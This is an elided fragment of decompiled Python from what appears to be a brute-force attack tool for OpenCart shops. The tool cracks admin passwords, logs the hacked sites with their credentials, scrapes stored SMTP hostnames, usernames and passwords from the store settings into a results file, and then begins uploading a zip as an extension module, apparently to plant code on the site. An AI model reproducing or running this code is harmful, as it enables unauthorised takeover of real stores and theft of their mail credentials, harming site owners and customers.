...
# [GCC 9.3.0]
# Embedded file name: BruteForce\Opencart.py
import requests
import re
import threading
import time
        ...
        try:
            ...
            if 'user_token=' in str(GoT.content):
                try:
                    ...
                    Sm = sess.get('http://{}/admin/index.php?route=setting/setting&user_token={}'.format(site, Token), timeout=10, headers=Headers)
                    try:
                        with open('result/OpenCart_Hacked.txt', 'a') as writer:
                            writer.write('http://' + site + '/admin/index.php' + '\n Username: admin' + '\n Password: ' + passwd + '\n-----------------------------------------\n')
                        smtp_hostname = re.findall('name="config_mail_smtp_hostname" value="(.*)"', str(Sm.content))[0].split('"')[0]
                        smtp_username = re.findall('name="config_mail_smtp_username" value="(.*)"', str(Sm.content))[0].split('"')[0]
                        smtp_password = re.findall('name="config_mail_smtp_password" value="(.*)"', str(Sm.content))[0].split('"')[0]
                        smtp_port = re.findall('name="config_mail_smtp_port" value="(.*)"', str(Sm.content))[0].split('"')[0]
                        if smtp_password == '' and smtp_username == '':
                            pass
                        else:
                            with open('result/SMTP_Results.txt', 'a') as writer:
                                writer.write('HostName: {}'.format(smtp_hostname) + '\nuser: {}'.format(smtp_username) + '\nPass: {}'.format(smtp_password) + '\nPORT: {}'.format(smtp_port) + '\n-----------------------------------------\n')
                    except:
                        self.flag = 1
                    ...
                    try:
                        ...
                        files = {'file': (
                                  'rsz.ocmod2.zip', open('files/rsz.ocmod2.zip', 'rb'))
                           }
                ...
                try:
                    ...
                    Sm = sess.get('http://{}/admin/index.php?route=setting/setting&token={}'.format(site, Token), timeout=10, headers=Headers)
                    try:
                        with open('result/OpenCart_Hacked.txt', 'a') as writer:
                            writer.write('http://' + site + '/admin/index.php' + '\n Username: admin' + '\n Password: ' + passwd + '\n-----------------------------------------\n')
                        smtp_hostname = re.findall('name="config_mail_smtp_hostname" value="(.*)"', str(Sm.content))[0].split('"')[0]
